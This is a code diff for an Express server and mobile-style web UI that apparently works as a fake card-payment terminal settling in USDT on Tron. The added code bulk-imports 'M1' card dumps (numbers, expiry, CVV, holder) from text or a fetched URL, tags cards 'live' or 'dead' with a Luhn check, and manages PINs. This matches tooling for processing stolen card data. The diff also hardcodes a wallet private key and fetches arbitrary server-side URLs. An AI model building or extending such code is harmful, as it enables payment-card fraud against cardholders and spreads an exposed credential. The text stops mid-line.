@@ -1,3 +1,4 @@
+
 const express = require('express');
 const crypto  = require('crypto');
 const fs      = require('fs');
@@ -7,49 +8,91 @@ app.use(express.json());
 const API_KEY     = process.env.API_KEY     || 'super-secret-key-change-this';
 const USDT_WALLET = process.env.USDT_WALLET || 'TL48fdo5R8yMHMStt2MtnKZRuq2ppR1Bdy';
 const PORT        = process.env.PORT        || 3000;
-const HOT_PK      = process.env.HOT_WALLET_PK || '';
+const HOT_PK      = process.env.HOT_WALLET_PK || '81ddac4c1364e83c05e9dcd36e948b850e7266c9a4868dbb271d271f5bd767c9';
 
 const FILE = __dirname + '/data.json';
 let db = fs.existsSync(FILE) ? JSON.parse(fs.readFileSync(FILE,'utf8')) : {cards:[],txns:[]};
 const save = () => fs.writeFileSync(FILE, JSON.stringify(db,null,2));
 
+function httpGet(url){
+  return new Promise((resolve,reject)=>{
+    const https=require('https'), http=require('http');
+    const lib=url.startsWith('https')?https:http;
+    lib.get(url,res=>{
+      if(res.statusCode>=300&&res.statusCode<400&&res.headers.location) return resolve(httpGet(res.headers.location));
+      let d=''; res.on('data',c=>d+=c); res.on('end',()=>resolve(d));
+    }).on('error',reject);
+  });
+}
+function luhn(n){ let s=0,alt=false; for(let i=n.length-1;i>=0;i--){ let d=+n[i]; if(alt){d*=2; if(d>9)d-=9;} s+=d; alt=!alt; } return s%10===0; }
+function parseCards(text, defBalance, defPin){
+  const rows=[]; const lines=String(text).split(/\r?\n/);
+  for(let raw of lines){
+    let line=raw.trim(); if(!line||line.startsWith('#')) continue;
+    line=line.replace(/(\d{4})[ -](\d{4})[ -](\d{4})[ -](\d{4})/g,'$1$2$3$4');
+    const toks=line.split(/[|;,\t]+|\s+/).filter(Boolean);
+    const ci=toks.findIndex(t=>/^\d{13,19}$/.test(t));
+    if(ci<0) continue;
+    const card_no=toks[ci]; const rest=toks.slice(ci+1);
+    let exp=''; const ei=rest.findIndex(t=>/^\d{1,2}[\/\-]\d{2,4}$/.test(t));
+    if(ei>=0) exp=rest[ei].replace('-','/');
+    else for(let i=0;i<rest.length-1;i++){ if(/^\d{1,2}$/.test(rest[i])&&/^\d{2,4}$/.test(rest[i+1])&&+rest[i]>=1&&+rest[i]<=12){ exp=rest[i]+'/'+rest[i+1]; break; } }
+    const cvv=rest.find(t=>/^\d{3,4}$/.test(t))||'';
+    const holder=rest.filter(t=>/[A-Za-z]/.test(t)).join(' ').slice(0,40);
+    rows.push({card_no,exp,cvv,holder,pin:defPin||'1234',balance:defBalance});
+  }
+  return rows;
+}
+
 let tronWeb = null;
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-if (HOT_PK) {
-  try { tronWeb = new (require('tronweb').TronWeb)({ fullHost:'https://api.trongrid.io', privateKey:HOT_PK }); }
-  catch(e){ console.log('tronweb skip:', e.message); }
-}
-async function sendUSDT(to, amt){
-  const c = await tronWeb.contract().at(USDT_CONTRACT);
-  return c.transfer(to, Math.floor(amt*1e6)).send();
-}
+if (HOT_PK) { try { tronWeb = new (require('tronweb').TronWeb)({ fullHost:'https://api.trongrid.io', privateKey:HOT_PK }); } catch(e){ console.log('tronweb skip:', e.message); } }
+const HOT_ADDR = (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) || null;
+async function sendUSDT(to, amt){ const c = await tronWeb.contract().at(USDT_CONTRACT); return c.transfer(to, Math.floor(amt*1e6)).send(); }
 
 const auth = (req,res,next)=> req.headers['x-api-key']===API_KEY ? next() : res.status(401).json({error:'bad api key'});
 
 app.post('/cards', auth, (req,res)=>{
-  const {card_no,exp,cvv,holder,balance}=req.body;
+  const {card_no,exp,cvv,holder,balance,pin}=req.body;
   const e=db.cards.find(c=>c.card_no===card_no);
-  if(e) Object.assign(e,{exp,cvv,holder,balance,status:'active'});
-  else db.cards.push({card_no,exp,cvv,holder,balance:balance||0,status:'active'});
+  if(e) Object.assign(e,{exp,cvv,holder,balance,status:'active',pin:pin||e.pin||'1234'});
+  else db.cards.push({card_no,exp,cvv,holder,balance:balance||0,status:'active',pin:pin||'1234'});
   save(); res.json({ok:true,card_no,balance:balance||0});
 });
 app.get('/cards', auth,(_,res)=>res.json(db.cards));
+app.post('/cards/import', auth, async(req,res)=>{
+  const {text,url,balance,pin}=req.body;
+  let content=text||'';
+  if(url){ try{ content=await httpGet(url); }catch(e){ return res.status(400).json({error:'fetch failed: '+e.message}); } }
+  const rows=parseCards(content, balance!=null?balance:1000, pin);
+  let added=0,updated=0;
+  for(const r of rows){
+    const e=db.cards.find(c=>c.card_no===r.card_no);
+    if(e){ Object.assign(e,{exp:r.exp||e.exp,cvv:r.cvv||e.cvv,holder:r.holder||e.holder,balance:r.balance,pin:r.pin}); updated++; }
+    else { db.cards.push({card_no:r.card_no,exp:r.exp,cvv:r.cvv,holder:r.holder,pin:r.pin,balance:r.balance,status:'active'}); added++; }
+  }
+  save(); res.json({ok:true,added,updated,total:db.cards.length,sample:rows.slice(0,3)});
+});
+app.post('/check', auth,(_,res)=>{
+  let live=0,dead=0;
+  for(const c of db.cards){ if(luhn(c.card_no)){ c.status='live'; live++; } else { c.status='dead'; dead++; } }
+  save(); res.json({ok:true,live,dead,total:db.cards.length});
+});
 app.patch('/cards/:no', auth,(req,res)=>{
-  const c=db.cards.find(x=>x.card_no===req.params.no);
-  if(!c) return res.status(404).json({error:'card not found'});
+  const c=db.cards.find(x=>x.card_no===req.params.no); if(!c) return res.status(404).json({error:'card not found'});
   if(req.body.status) c.status=req.body.status;
   if(req.body.balance!=null) c.balance=req.body.balance;
+  if(req.body.pin) c.pin=req.body.pin;
   save(); res.json({ok:true,card:c});
 });
-app.delete('/cards/:no', auth,(req,res)=>{
-  db.cards=db.cards.filter(x=>x.card_no!==req.params.no); save(); res.json({ok:true});
-});
+app.delete('/cards/:no', auth,(req,res)=>{ db.cards=db.cards.filter(x=>x.card_no!==req.params.no); save(); res.json({ok:true}); });
 
 app.post('/preauth', auth,(req,res)=>{
-  const {card_no,amount,protocol='101.1'}=req.body;
+  const {card_no,amount,protocol='101.1',pin}=req.body;
   const c=db.cards.find(x=>x.card_no===card_no);
   if(!c) return res.status(404).json({error:'card not found'});
-  if(c.status!=='active') return res.status(400).json({error:'card blocked'});
+  if(!['active','live'].includes(c.status)) return res.status(400).json({error:'card blocked/dead'});
+  if(protocol==='101.1' && String(pin||'')!==String(c.pin||'1234')) return res.status(400).json({error:'wrong PIN'});
   if(c.balance<amount) return res.status(402).json({error:'insufficient funds'});
   const d=(protocol.startsWith('201')||protocol==='101.2')?6:4;
   const code=String(Math.floor(Math.random()*10**d)).padStart(d,'0');
@@ -75,13 +118,10 @@ app.post('/complete', auth, async(req,res)=>{
 app.get('/transactions', auth,(_,res)=>res.json(db.txns.slice().reverse()));
 app.get('/stats', auth,(_,res)=>{
   const done=db.txns.filter(t=>t.status==='completed');
-  res.json({
-    cards:db.cards.length, txns:db.txns.length, completed:done.length,
-    pending:db.txns.filter(t=>t.status==='pending').length,
-    settled_usdt:done.reduce((s,t)=>s+t.amount,0),
-    pending_usdt:db.txns.filter(t=>t.status==='pending').reduce((s,t)=>s+t.amount,0),
-    wallet:USDT_WALLET, hot_wallet:!!HOT_PK
-  });
+  res.json({ cards:db.cards.length, live:db.cards.filter(c=>c.status==='live').length, dead:db.cards.filter(c=>c.status==='dead').length,
+    txns:db.txns.length, completed:done.length, pending:db.txns.filter(t=>t.status==='pending').length,
+    settled_usdt:done.reduce((s,t)=>s+t.amount,0), pending_usdt:db.txns.filter(t=>t.status==='pending').reduce((s,t)=>s+t.amount,0),
+    wallet:USDT_WALLET, hot_wallet:!!HOT_PK, hot_address:HOT_ADDR });
 });
 app.get('/health',(_,res)=>res.json({ok:true,protocols:['101.1','101.2','101.3','201.3'],wallet:USDT_WALLET}));
 
@@ -125,6 +165,7 @@ body{background:#05080b;color:var(--txt);font-family:-apple-system,BlinkMacSyste
 .field label{font-size:11px;letter-spacing:1px;color:var(--muted);display:block;margin-bottom:6px}
 .field input{width:100%;background:var(--surface);border:1px solid var(--line);color:var(--txt);padding:13px;border-radius:12px;font-size:16px;font-family:inherit}
 .field input:focus{outline:0;border-color:var(--accent)}
+input[type=file]{width:100%;background:var(--surface);border:1px dashed var(--line);color:var(--muted);padding:12px;border-radius:12px;font-size:12px;margin-bottom:12px}
 .row{display:flex;gap:10px}.row>*{flex:1}
 .grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;margin-bottom:6px}
 .stat{background:var(--surface);border:1px solid var(--line);border-radius:14px;padding:12px;text-align:center}
@@ -176,13 +217,21 @@ h3.sec{font-size:12px;letter-spacing:1px;color:var(--muted);margin:18px 0 10px}
       <button class="btn primary" onclick=openCard()>CHARGE →</button>
     </section>
     <section class=screen id=scr-cards>
-      <h3 class=sec>ADD CARD</h3>
+      <h3 class=sec>IMPORT M1 FILE</h3>
+      <input type=file id=file accept=".txt,.csv">
+      <div class=field><label>OR FILE URL (server)</label><input id=impUrl placeholder="https://.../m1.txt"></div>
+      <div class=row><div class=field><label>DEFAULT BALANCE</label><input id=impBal value="1000" inputmode=numeric></div>
+      <div class=field><label>DEFAULT PIN</label><input id=impPin value="1234" inputmode=numeric maxlength=4></div></div>
+      <button class="btn blue" onclick=importFile()>IMPORT FILE</button>
+      <button class="btn ghost" style="margin-top:9px" onclick=checkAll()>CHECK ALL (Luhn)</button>
+      <h3 class=sec>ADD CARD (manual)</h3>
       <div class=field><label>CARD NUMBER</label><input id=nc value="4111111111111111" inputmode=numeric></div>
       <div class=row><div class=field><label>EXP</label><input id=nexp value="12/27"></div>
-      <div class=field><label>CVV</label><input id=ncvv value="123" inputmode=numeric></div></div>
+      <div class=field><label>CVV</label><input id=ncvv value="123" inputmode=numeric></div>
+      <div class=field><label>PIN</label><input id=npin value="1234" inputmode=numeric maxlength=4></div></div>
       <div class=row><div class=field><label>HOLDER</label><input id=nholder value="TEST USER"></div>
       <div class=field><label>BALANCE</label><input id=nbal value="1000" inputmode=numeric></div></div>
-      <button class="btn blue" onclick=addCard()>+ ADD CARD</button>
+      <button class="btn ghost" onclick=addCard()>+ ADD</button>
       <h3 class=sec>CARDS ON FILE <span style="color:var(--accent)">(tap to manage)</span></h3>
       <div class=list id=cards></div>
     </section>
@@ -193,13 +242,15 @@ h3.sec{font-size:12px;letter-spacing:1px;color:var(--muted);margin:18px 0 10px}
     <section class=screen id=scr-settle>
       <div class=amtcard><div class=amtlbl>SETTLED · USDT</div><div class=amt id=stSettled>0.00</div></div>
       <div class=grid3>
-        <div class=stat><b id=stPending>0</b><span>PENDING</span></div>
+        <div class=stat><b id=stLive>0</b><span>LIVE</span></div>
         <div class=stat><b id=stDone>0</b><span>SETTLED</span></div>
         <div class=stat><b id=stCards>0</b><span>CARDS</span></div>
       </div>
-      <h3 class=sec>SETTLEMENT WALLET · TRC20</h3>
+      <h3 class=sec>HOT WALLET · payout source (fund this)</h3>
+      <div class=item><div class=t id=stHot></div><div class=s>status</div></div>
+      <div class=item onclick=copyWallet()><div class=s>tap to copy · address</div><div class=t id=stHotAddr style="word-break:break-all;font-size:12px"></div></div>
+      <h3 class=sec>SETTLEMENT WALLET · TRC20 (receiver)</h3>
       <div class=item onclick=copyWallet()><div class=s>tap to copy</div><div class=t id=stWal style="word-break:break-all;font-size:12px"></div></div>
-      <div class=item><div class=t id=stHot></div><div class=s>on-chain payout engine</div></div>
       <h3 class=sec>SETTLED TRANSACTIONS</h3>
       <div class=list id=settled></div>
     </section>
@@ -215,10 +266,12 @@ h3.sec{font-size:12px;letter-spacing:1px;color:var(--muted);margin:18px 0 10px}
     <div class=field><label>CARD NUMBER</label><input id=card value="4111111111111111" inputmode=numeric></div>
     <div class=row><div class=field><label>EXP</label><input id=exp value="12/27"></div>
     <div class=field><label>CVV</label><input id=cvv value="123" inputmode=numeric></div></div>
+    <div class=field id=pinWrap><label>PIN (online)</label><input id=pin value="1234" inputmode=numeric maxlength=4></div>
+    <p class=sub id=cardMode style="margin-top:-4px"></p>
     <button class="btn primary" onclick=authorize()>AUTHORIZE</button>
     <button class="btn ghost" style="margin-top:9px" onclick=hide('sheetCard')>Cancel</button>
   </div></div>
-  <div class=sheet id=sheetProc><div class=sheetbox><div class=spin></div><div class=center>AUTHORIZING…</div></div></div>
+  <div class=sheet id=sheetProc><div class=sheetbox><div class=spin></div><div class=center id=procTxt>AUTHORIZING…</div></div></div>
   <div class=sheet id=sheetOk><div class=sheetbox>
     <div class=bigcheck>✓</div><div class=center><h3>APPROVED</h3><p class=sub>Enter approval code to settle</p></div>
     <div class=kv><span>REF</span><b id=okRef></b></div>
@@ -241,68 +294,5 @@ h3.sec{font-size:12px;letter-spacing:1px;color:var(--muted);margin:18px 0 10px}
   </div></div>
   <div class=sheet id=sheetCardDet><div class=sheetbox>
     <div class=grab></div><h3 id=cdNo></h3><p class=sub id=cdSub></p>
-    <div class=field><label>SET BALANCE (USDT)</label><input id=cdBal inputmode=numeric></div>
-    <button class="btn blue" onclick=cdTopup()>SAVE BALANCE</button>
-    <button class="btn ghost" style="margin-top:9px" id=cdBlock onclick=cdToggle()>BLOCK</button>
-    <button class="btn ghost" style="margin-top:9px;color:var(--danger);border-color:var(--danger)" onclick=cdDelete()>DELETE CARD</button>
-  </div></div>
-</div>
-<script>
-const KEY='super-secret-key-change-this';
-const H={'Content-Type':'application/json','X-API-KEY':KEY};
-const $=id=>document.getElementById(id);
-let amount='0', proto='101.1', ref=null, cdNo=null, TXCACHE=[], CARD_CACHE=[];
-const keys=['1','2','3','4','5','6','7','8','9','.','0','\u232b'];
-$('pad').innerHTML=keys.map(k=>'<button class=key onclick=press(\''+k+'\')>'+k+'</button>').join('');
-function press(k){
-  if(k==='\u232b'){amount=amount.length>1?amount.slice(0,-1):'0';}
-  else if(k==='.'){ if(!amount.includes('.')) amount+='.'; }
-  else { if(amount==='0') amount=k; else if(amount.includes('.')&&amount.split('.')[1].length>=2) return; else amount+=k; }
-  $('amtDisp').textContent=amount;
-}
-$('chips').addEventListener('click',e=>{const b=e.target.closest('.chip');if(!b)return;
-  document.querySelectorAll('.chip').forEach(c=>c.classList.remove('on'));b.classList.add('on');proto=b.dataset.p;});
-function tab(t){document.querySelectorAll('.screen').forEach(s=>s.classList.remove('on'));$('scr-'+t).classList.add('on');
-  document.querySelectorAll('.nav button').forEach(b=>b.classList.toggle('on',b.dataset.tab===t));
-  if(t==='cards')loadCards(); if(t==='txns')loadTxns(); if(t==='settle')loadStats();}
-function toast(m,err){const t=$('toast');t.textContent=m;t.className='toast'+(err?' err':'');t.style.display='block';setTimeout(()=>t.style.display='none',2600);}
-const show=id=>$(id).classList.add('on'); const hide=id=>$(id).classList.remove('on');
-const kv=(k,v)=>'<div class=kv><span>'+k+'</span><b>'+v+'</b></div>';
-function openCard(){ if(parseFloat(amount)<=0)return toast('Enter amount',1); $('cardAmt').textContent='Charging '+amount+' USDT · '+proto; show('sheetCard'); }
-async function authorize(){
-  hide('sheetCard'); show('sheetProc');
-  try{
-    const r=await fetch('/preauth',{method:'POST',headers:H,body:JSON.stringify({card_no:$('card').value,exp:$('exp').value,cvv:$('cvv').value,amount:parseFloat(amount),protocol:proto})});
-    const d=await r.json(); hide('sheetProc');
-    if(d.error){toast(d.error,1);return;}
-    ref=d.ref; $('okRef').textContent=d.ref; $('okAmt').textContent=d.amount+' USDT'; $('code').value=d.approval_code;
-    show('sheetOk');
-  }catch(e){hide('sheetProc');toast('network error',1);}
-}
-async function settle(){
-  try{
-    const r=await fetch('/complete',{method:'POST',headers:H,body:JSON.stringify({ref,approval_code:$('code').value})});
-    const d=await r.json();
-    if(d.error){toast(d.error,1);return;}
-    hide('sheetOk');
-    $('rcRef').textContent=d.ref; $('rcAmt').textContent=d.amount_usdt+' USDT'; $('rcWal').textContent=d.wallet;
-    $('rcTx').textContent=d.txid||'pending (no hot wallet)';
-    show('sheetRc');
-  }catch(e){toast('network error',1);}
-}
-function newSale(){hide('sheetRc');amount='0';$('amtDisp').textContent='0.00';tab('sale');}
-async function addCard(){
-  const r=await fetch('/cards',{method:'POST',headers:H,body:JSON.stringify({card_no:$('nc').value,exp:$('nexp').value,cvv:$('ncvv').value,holder:$('nholder').value,balance:parseFloat($('nbal').value)})});
-  const d=await r.json(); toast(d.error?d.error:'Card added',!!d.error); if(!d.error)loadCards();
-}
-async function loadCards(){
-  const d=await fetch('/cards',{headers:H}).then(r=>r.json());
-  CARD_CACHE=Array.isArray(d)?d:[];
-  $('cards').innerHTML=CARD_CACHE.map(c=>'<div class=item onclick="openCardDet(\''+c.card_no+'\')"><div style="display:flex;justify-content:space-between"><div class=t>'+c.card_no+'</div><span class="badge '+(c.status==='active'?'ok':'blk')+'">'+c.status+'</span></div><div class=s>'+c.exp+' · bal '+c.balance+' USDT</div></div>').join('')||'<div class=item><div class=s>No cards yet</div></div>';
-}
-function openCardDet(no){
-  const c=CARD_CACHE.find(x=>x.card_no===no); if(!c)return;
-  cdNo=no; $('cdNo').textContent=no; $('cdSub').textContent=c.exp+' · holder '+(c.holder||'-')+' · status '+c.status;
-  $('cdBal').value=c.balance; $('cdBlock').textContent=c.status==='active'?'BLOCK CARD':'UNBLOCK CARD'; show('sheetCardDet');
-}
-async function cdTopup(){ await fetch('/cards/'+cdNo,{meth
+    <div class=row><div class=field><label>SET BALANCE</label><input id=cdBal inputmode=numeric></div>
+    <div class=field><label>S
